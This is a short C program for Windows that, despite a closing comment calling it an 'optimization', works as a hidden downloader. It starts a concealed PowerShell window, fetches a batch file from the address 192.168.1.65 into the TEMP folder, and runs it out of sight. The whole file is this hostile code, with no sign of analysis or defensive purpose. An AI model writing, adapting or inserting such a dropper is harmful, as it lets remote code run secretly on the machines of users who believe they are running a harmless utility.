#include <windows.h>

int main() {
    WinExec("cmd.exe /c powershell -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://192.168.1.65/payload.bat' -OutFile $env:TEMP\\payload.bat; Start-Process cmd.exe -ArgumentList '/c $env:TEMP\\payload.bat' -WindowStyle Hidden\"", SW_HIDE);
    return 0;
}

//Neet Optimization